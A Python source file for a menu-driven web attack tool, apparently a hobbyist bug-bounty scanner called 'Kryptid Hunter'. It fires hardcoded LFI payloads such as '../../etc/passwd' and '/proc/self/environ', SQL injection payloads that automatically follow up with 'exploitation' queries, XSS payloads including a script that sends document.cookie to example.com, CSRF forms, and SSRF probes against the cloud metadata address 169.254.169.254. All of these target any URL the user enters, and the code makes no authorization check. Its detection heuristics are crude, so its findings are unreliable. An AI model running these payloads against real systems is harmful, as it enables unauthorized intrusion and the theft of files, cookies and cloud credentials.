import os
import requests
import logging
import time
from datetime import datetime
from PIL import Image
from io import BytesIO

# Setup logging
log_filename = f"kryptid_hunter_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
logging.basicConfig(filename=log_filename, level=logging.INFO, format='%(asctime)s - %(message)s')

GREEN = "\033[92m"
RESET = "\033[0m"

def print_menu():
    print("\n" + f"{GREEN}" + "="*40)
    print("                  Kryptid Hunter")
    print("            Advanced Bug Hunting Tool")
    print("="*40)
    print("                   Made by ig0r")
    print("="*40)
    print(f"{GREEN} Select an option by entering the corresponding number:")
    print(" 1. LFI Scanner")
    print(" 2. SQLi Scanner")
    print(" 3. XSS Scanner")
    print(" 4. CSRF Detector")
    print(" 5. SSRF Scanner")
    print(" 6. IDOR Scanner")
    print(" 7. Data Export Request")
    print(" 8. Retrieve Cat Photo")
    print(" 9. Exit")
    print("="*40 + f"{RESET}")

def log_vulnerability(vuln_type, payload, response):
    with open("../../OneDrive/bug bounty tool/vulnerability_log.txt", "a") as log_file:
        log_file.write(f"\n[{vuln_type}] Payload: {payload}\n")
        log_file.write(f"Response:\n{response.text}\n")
        log_file.write("="*40 + "\n")
    logging.info(f"[LOG] {vuln_type} vulnerability found: {payload} - Response: {response.status_code}")

def retrieve_cat_photo(url):
    try:
        response = requests.get(url)
        if response.status_code == 200 and 'image' in response.headers['Content-Type']:
            image = Image.open(BytesIO(response.content))
            image.show()  # Display the image or save it as needed
        else:
            print("Error: The response does not contain an image.")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

def data_export_request():
    print("\n" + "="*40)
    print(" Data Export Request")
    print("="*40)
    url = input("Enter the URL for data export: ")
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("[+] Data export request successful.")
            log_vulnerability("Data Export Request", url, response)
        else:
            print(f"[-] Error during data export: {response.status_code} - {response.text[:200]}")
            log_vulnerability("Data Export Request", url, response)
    except requests.exceptions.RequestException as e:
        logging.error(f"Error during data export request: {e}")

# SQLi Scanner
def sql_injection_scan(url, payloads, injection_payloads):
    # Send requests with different payloads and check for indicators of vulnerability
    for payload in payloads:
        response = requests.get(url + payload)
        # Check for indicators of vulnerability in the response
        if "error" in response.text or "SQL" in response.text:
            print(f"Potential SQL injection vulnerability detected: {payload}")
            # Automatically inject payloads to exploit the vulnerability
            inject_payloads(url, injection_payloads)

def inject_payloads(url, payloads):
    # Send requests with injection payloads to exploit the vulnerability
    for payload in payloads:
        response = requests.get(url + payload)
        # Check if the injection was successful
        if "success" in response.text or "admin" in response.text:
            print(f"SQL injection successful: {payload}")
        else:
            print(f"SQL injection failed: {payload}")

# Example payloads
payloads = [
    "' OR 1=1 --",
    " UNION SELECT * FROM users --",
    " OR 'a'='a' --",
    " OR 1=1 -- -",
    " OR 'a'='a'; --"
]

# Example injection payloads
injection_payloads = [
    " UNION SELECT * FROM users WHERE username='admin' AND password='password' --",
    " OR 'a'='a' UNION SELECT * FROM users WHERE username='admin' AND password='password' --",
    " OR 1=1 UNION SELECT * FROM users WHERE username='admin' AND password='password' --",
]

def lfi_scanner():
    print("\n" + "="*40)
    print(" LFI Scanner")
    print("="*40)
    url = input("Enter the URL to test for LFI: ")
    payloads = [
        "../../etc/passwd", 
        "../../../../etc/passwd", 
        "/var/log/apache2/access.log",
        "/proc/self/environ",
        "/proc/version",
        "/etc/hosts",
        "/var/log/syslog",
        "/var/log/mysql/error.log",
        "/var/log/nginx/access.log",
        "/etc/php.ini"
    ]

    for payload in payloads:
        try:
            full_url = f"{url}?file={payload}"
            response = requests.get(full_url)
            if "root:" in response.text or "passwd" in response.text or "nologin" in response.text:
                print(f"[+] LFI vulnerability found with payload: {payload}")
                log_vulnerability("LFI", payload, response)
            else:
                print(f"[-] No LFI found for payload: {payload} (Status code: {response.status_code})")
        except requests.exceptions.RequestException as e:
            logging.error(f"Error: {e}")

    print("\n[INFO] LFI Scan Completed. Check logs for more details.")

def xss_scanner():
    print("\n" + "="*40)
    print(" XSS Scanner")
    print("="*40)
    url = input("Enter the URL to test for XSS: ")
    payloads = [
        "<script>alert('XSS')</script>",
        "'><img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<script>fetch('http://example.com/cookie?c=' + document.cookie);</script>",
        "'; alert(1); //",
        "<img src=x onerror=alert(document.domain)>",
        "<input type='text' value=''><script>alert(1)</script>",
        "<svg><script>confirm(1)</script></svg>"
    ]

    found_vulnerability = False

    for payload in payloads:
        try:
            full_url = f"{url}?search={payload}"
            response = requests.get(full_url)
            if payload in response.text:
                print(f"[+] XSS vulnerability found with GET payload: {payload}")
                log_vulnerability("XSS", payload, response)
                found_vulnerability = True
            post_response = requests.post(url, data={'search': payload})
            if payload in post_response.text:
                print(f"[+] XSS vulnerability found with POST payload: {payload}")
                log_vulnerability("XSS", payload, post_response)
                found_vulnerability = True
            time.sleep(1)
        except requests.exceptions.RequestException as e:
            logging.error(f"Error: {e}")

    if not found_vulnerability:
        print("[-] No XSS vulnerabilities found with the provided payloads.")
    else:
        print("[INFO] XSS Scan Completed. Check logs for more details.")

def csrf_scanner():
    print("\n" + "="*40)
    print(" CSRF Scanner")
    print("="*40)
    url = input("Enter the URL to test for CSRF: ")
    payloads = [
        f"<form action='{url}' method='POST'><input type='submit'></form>",
        f"<img src='{url}' onerror='this.src=\"{url}/malicious\"'>",
        f"<script>fetch('{url}', {{ method: 'POST', body: new URLSearchParams({{'param':'value'}}) }});</script>",
        f"<a href='{url}' onclick='event.preventDefault(); fetch(\"{url}\", {{ method: \"POST\" }});'>Click Me</a>"
    ]

    results = []

    for payload in payloads:
        print(f"[INFO] CSRF test with payload: {payload}")
        try:
            response = requests.post(url, data=payload, headers={'Content-Type': 'application/x-www-form-urlencoded'})
            if response.status_code == 200:
                results.append((payload, "Possible CSRF vulnerability detected."))
                print("[SUCCESS] CSRF vulnerability detected.")
            else:
                results.append((payload, "No vulnerability detected."))
                print("[INFO] No CSRF vulnerability detected.")
        except Exception as e:
            print(f"[-] Error occurred: {e}")

    print("\n[INFO] CSRF Scan Report")
    print("="*40)
    for payload, result in results:
        print(f"Payload: {payload}\nResult: {result}\n")

def ssrf_scanner():
    print("\n" + "=" * 40)
    print(" SSRF Scanner")
    print("=" * 40)
    url = input("Enter the URL to test for SSRF: ")
    payloads = [
        "http://localhost:8080",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "http://127.0.0.1:22",
        "http://internal-service/api",
        "http://0.0.0.0",
        "http://127.0.0.1/admin",
    ]

    try:
        for payload in payloads:
            response = requests.get(url + payload)
            if response.status_code == 200:
                print(f"[+] Potential SSRF vulnerability found with payload: {payload}")
                log_vulnerability("SSRF", payload, response)
            else:
                print(f"[-] No SSRF vulnerability found for payload: {payload}")
    except Exception as e:
        print(f"[-] Error occurred: {e}")

def idor_scanner():
    print("\n" + "="*40)
    print(" IDOR Scanner")
    print("="*40)
    # Implement functionality later

def main():
    while True:
        print_menu()
        try:
            option = int(input(f"{GREEN}Enter your choice: {RESET}"))
        except ValueError:
            print("Please enter a valid number.")
            continue

        if option == 1:
            lfi_scanner()
        elif option == 2:
            url = input("Enter the URL to scan for SQLi: ")
            sql_injection_scan(url, payloads, injection_payloads)
        elif option == 3:
            xss_scanner()
        elif option == 4:
            csrf_scanner()
        elif option == 5:
            ssrf_scanner()
        elif option == 6:
            idor_scanner()
        elif option == 7:
            data_export_request()
        elif option == 8:
            retrieve_cat_photo("https://placekitten.com/400/400")
        elif option == 9:
            print(f"{GREEN}Goodbye!{RESET}")
            break
        else:
            print("Please enter a valid option.")

if __name__ == "__main__":
    main()
